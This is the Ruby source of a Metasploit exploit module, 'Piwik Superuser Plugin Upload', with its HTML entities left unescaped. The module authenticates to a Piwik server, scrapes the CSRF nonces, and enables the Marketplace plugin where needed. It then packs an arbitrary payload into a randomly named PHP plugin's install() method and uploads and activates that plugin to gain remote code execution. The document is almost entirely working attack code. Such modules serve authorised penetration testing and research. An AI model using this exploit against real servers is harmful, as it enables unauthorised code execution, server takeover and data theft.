# This module requires Metasploit: http://www.metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
require &#039;rex/zip&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(
      info,
      &#039;Name&#039;            => &#039;Piwik Superuser Plugin Upload&#039;,
      &#039;Description&#039;     => %q{
          This module will generate a plugin, pack the payload into it
          and upload it to a server running Piwik. Superuser Credentials are
          required to run this module. This module does not work against Piwik 1
          as there is no option to upload custom plugins.
          Tested with Piwik 2.14.0, 2.16.0, 2.17.1 and 3.0.1.
        },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;FireFart&#039; # Metasploit module
        ],
      &#039;References&#039;      =>
        [
          [ &#039;URL&#039;, &#039;https://firefart.at/post/turning_piwik_superuser_creds_into_rce/&#039; ]
        ],
      &#039;DisclosureDate&#039;  => &#039;Feb 05 2017&#039;,
      &#039;Platform&#039;        => &#039;php&#039;,
      &#039;Arch&#039;            => ARCH_PHP,
      &#039;Targets&#039;         => [[&#039;Piwik&#039;, {}]],
      &#039;DefaultTarget&#039;   => 0
    ))
 
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI path of the Piwik installation&#039;, &#039;/&#039;]),
        OptString.new(&#039;USERNAME&#039;, [true, &#039;The Piwik username to authenticate with&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;The Piwik password to authenticate with&#039;])
      ], self.class)
  end
 
  def username
    datastore[&#039;USERNAME&#039;]
  end
 
  def password
    datastore[&#039;PASSWORD&#039;]
  end
 
  def normalized_index
    normalize_uri(target_uri, &#039;index.php&#039;)
  end
 
  def get_piwik_version(login_cookies)
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalized_index,
      &#039;cookie&#039; => login_cookies,
      &#039;vars_get&#039; => {
        &#039;module&#039; => &#039;Feedback&#039;,
        &#039;action&#039; => &#039;index&#039;,
        &#039;idSite&#039; => &#039;1&#039;,
        &#039;period&#039; => &#039;day&#039;,
        &#039;date&#039; => &#039;yesterday&#039;
      }
    })
 
    piwik_version_regexes = [
      /<title>About Piwik ([\w\.]+) -/,
      /content-title="About&#x20;Piwik&#x20;([\w\.]+)"/,
      /<h2 piwik-enriched-headline\s+feature-name="Help"\s+>About Piwik ([\w\.]+)/m
    ]
 
    if res && res.code == 200
      for r in piwik_version_regexes
        match = res.body.match(r)
        if match
          return match[1]
        end
      end
    end
 
    # check for Piwik version 1
    # the logo.svg is only available in version 1
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri, &#039;themes&#039;, &#039;default&#039;, &#039;images&#039;, &#039;logo.svg&#039;)
    })
    if res && res.code == 200 && res.body =~ /<!DOCTYPE svg/
      return "1.x"
    end
 
    nil
  end
 
  def is_superuser?(login_cookies)
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalized_index,
      &#039;cookie&#039; => login_cookies,
      &#039;vars_get&#039; => {
        &#039;module&#039; => &#039;Installation&#039;,
        &#039;action&#039; => &#039;systemCheckPage&#039;
      }
    })
 
    if res && res.body =~ /You can&#039;t access this resource as it requires a &#039;superuser&#039; access/
      return false
    elsif res && res.body =~ /id="systemCheckRequired"/
      return true
    else
      return false
    end
  end
 
  def generate_plugin(plugin_name)
    plugin_json = %Q|{
      "name": "#{plugin_name}",
      "description": "#{plugin_name}",
      "version": "#{Rex::Text.rand_text_numeric(1)}.#{Rex::Text.rand_text_numeric(1)}.#{Rex::Text.rand_text_numeric(2)}",
      "theme": false
    }|
 
    plugin_script = %Q|<?php
      namespace Piwik\\Plugins\\#{plugin_name};
      class #{plugin_name} extends \\Piwik\\Plugin {
        public function install()
        {
          #{payload.encoded}
        }
      }
    |
 
    zip = Rex::Zip::Archive.new(Rex::Zip::CM_STORE)
    zip.add_file("#{plugin_name}/#{plugin_name}.php", plugin_script)
    zip.add_file("#{plugin_name}/plugin.json", plugin_json)
    zip.pack
  end
 
  def exploit
    print_status(&#039;Trying to detect if target is running a supported version of piwik&#039;)
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalized_index
    })
    if res && res.code == 200 && res.body =~ /<meta name="generator" content="Piwik/
      print_good(&#039;Detected Piwik installation&#039;)
    else
      fail_with(Failure::NotFound, &#039;The target does not appear to be running a supported version of Piwik&#039;)
    end
 
    print_status("Authenticating with Piwik using #{username}:#{password}...")
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalized_index,
      &#039;vars_get&#039; => {
        &#039;module&#039; => &#039;Login&#039;,
        &#039;action&#039; => &#039;index&#039;
      }
    })
 
    login_nonce = nil
    if res && res.code == 200
      match = res.body.match(/name="form_nonce" id="login_form_nonce" value="(\w+)"\/>/)
      if match
        login_nonce = match[1]
      end
    end
    fail_with(Failure::UnexpectedReply, &#039;Can not extract login CSRF token&#039;) if login_nonce.nil?
 
    cookies = res.get_cookies
 
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalized_index,
      &#039;cookie&#039; => cookies,
      &#039;vars_get&#039; => {
        &#039;module&#039; => &#039;Login&#039;,
        &#039;action&#039; => &#039;index&#039;
      },
      &#039;vars_post&#039; => {
        &#039;form_login&#039; => "#{username}",
        &#039;form_password&#039; => "#{password}",
        &#039;form_nonce&#039; => "#{login_nonce}"
      }
    })
 
    if res && res.redirect? && res.redirection
      # update cookies
      cookies = res.get_cookies
    else
      # failed login responds with code 200 and renders the login form
      fail_with(Failure::NoAccess, &#039;Failed to authenticate with Piwik&#039;)
    end
    print_good(&#039;Authenticated with Piwik&#039;)
 
    print_status("Checking if user #{username} has superuser access")
    superuser = is_superuser?(cookies)
    if superuser
      print_good("User #{username} has superuser access")
    else
      fail_with(Failure::NoAccess, "Looks like user #{username} has no superuser access")
    end
 
    print_status(&#039;Trying to get Piwik version&#039;)
    piwik_version = get_piwik_version(cookies)
    if piwik_version.nil?
      print_warning(&#039;Unable to detect Piwik version. Trying to continue.&#039;)
    else
      print_good("Detected Piwik version #{piwik_version}")
    end
 
    if piwik_version == &#039;1.x&#039;
      fail_with(Failure::NoTarget, &#039;Piwik version 1 is not supported by this module&#039;)
    end
 
    # Only versions after 3 have a seperate Marketplace plugin
    if piwik_version && Gem::Version.new(piwik_version) >= Gem::Version.new(&#039;3&#039;)
      marketplace_available = true
    else
      marketplace_available = false
    end
 
    if marketplace_available
      print_status("Checking if Marketplace plugin is active")
      res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039; => normalized_index,
        &#039;cookie&#039; => cookies,
        &#039;vars_get&#039; => {
          &#039;module&#039; => &#039;Marketplace&#039;,
          &#039;action&#039; => &#039;index&#039;
        }
      })
      fail_with(Failure::UnexpectedReply, &#039;Can not check for Marketplace plugin&#039;) unless res
      if res.code == 200 && res.body =~ /The plugin Marketplace is not enabled/
        print_status(&#039;Marketplace plugin is not enabled, trying to enable it&#039;)
 
        res = send_request_cgi({
          &#039;method&#039; => &#039;GET&#039;,
          &#039;uri&#039; => normalized_index,
          &#039;cookie&#039; => cookies,
          &#039;vars_get&#039; => {
            &#039;module&#039; => &#039;CorePluginsAdmin&#039;,
            &#039;action&#039; => &#039;plugins&#039;
          }
        })
        mp_activate_nonce = nil
        if res && res.code == 200
          match = res.body.match(/<a href=[&#039;"]index\.php\?module=CorePluginsAdmin&action=activate&pluginName=Marketplace&nonce=(\w+).*[&#039;"]>/)
          if match
            mp_activate_nonce = match[1]
          end
        end
        fail_with(Failure::UnexpectedReply, &#039;Can not extract Marketplace activate CSRF token&#039;) unless mp_activate_nonce
        res = send_request_cgi({
          &#039;method&#039; => &#039;GET&#039;,
          &#039;uri&#039; => normalized_index,
          &#039;cookie&#039; => cookies,
          &#039;vars_get&#039; => {
            &#039;module&#039; => &#039;CorePluginsAdmin&#039;,
            &#039;action&#039; => &#039;activate&#039;,
            &#039;pluginName&#039; => &#039;Marketplace&#039;,
            &#039;nonce&#039; => "#{mp_activate_nonce}"
          }
        })
        if res && res.redirect?
          print_good(&#039;Marketplace plugin enabled&#039;)
        else
          fail_with(Failure::UnexpectedReply, &#039;Can not enable Marketplace plugin. Please try to manually enable it.&#039;)
        end
      else
        print_good(&#039;Seems like the Marketplace plugin is already enabled&#039;)
      end
    end
 
    print_status(&#039;Generating plugin&#039;)
    plugin_name = Rex::Text.rand_text_alpha(10)
    zip = generate_plugin(plugin_name)
    print_good("Plugin #{plugin_name} generated")
 
    print_status(&#039;Uploading plugin&#039;)
 
    # newer Piwik versions have a seperate Marketplace plugin
    if marketplace_available
      res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039; => normalized_index,
        &#039;cookie&#039; => cookies,
        &#039;vars_get&#039; => {
          &#039;module&#039; => &#039;Marketplace&#039;,
          &#039;action&#039; => &#039;overview&#039;
        }
      })
    else
      res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039; => normalized_index,
        &#039;cookie&#039; => cookies,
        &#039;vars_get&#039; => {
          &#039;module&#039; => &#039;CorePluginsAdmin&#039;,
          &#039;action&#039; => &#039;marketplace&#039;
        }
      })
    end
 
    upload_nonce = nil
    if res && res.code == 200
      match = res.body.match(/<form.+id="uploadPluginForm".+nonce=(\w+)/m)
      if match
        upload_nonce = match[1]
      end
    end
    fail_with(Failure::UnexpectedReply, &#039;Can not extract upload CSRF token&#039;) if upload_nonce.nil?
 
    # plugin files to delete after getting our session
    register_files_for_cleanup("plugins/#{plugin_name}/plugin.json")
    register_files_for_cleanup("plugins/#{plugin_name}/#{plugin_name}.php")
 
    data = Rex::MIME::Message.new
    data.add_part(zip, &#039;application/zip&#039;, &#039;binary&#039;, "form-data; name=\"pluginZip\"; filename=\"#{plugin_name}.zip\"")
    res = send_request_cgi(
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalized_index,
      &#039;ctype&#039;     => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039;      => data.to_s,
      &#039;cookie&#039;    => cookies,
      &#039;vars_get&#039; => {
        &#039;module&#039; => &#039;CorePluginsAdmin&#039;,
        &#039;action&#039; => &#039;uploadPlugin&#039;,
        &#039;nonce&#039; => "#{upload_nonce}"
      }
    )
    activate_nonce = nil
    if res && res.code == 200
      match = res.body.match(/<a.*href="index.php\?module=CorePluginsAdmin&action=activate.+nonce=([^&]+)/)
      if match
        activate_nonce = match[1]
      end
    end
    fail_with(Failure::UnexpectedReply, &#039;Can not extract activate CSRF token&#039;) if activate_nonce.nil?
 
    print_status(&#039;Activating plugin and triggering payload&#039;)
    send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalized_index,
      &#039;cookie&#039; => cookies,
      &#039;vars_get&#039; => {
        &#039;module&#039; => &#039;CorePluginsAdmin&#039;,
        &#039;action&#039; => &#039;activate&#039;,
        &#039;nonce&#039; => "#{activate_nonce}",
        &#039;pluginName&#039; => "#{plugin_name}"
      }
    }, 5)
  end
end

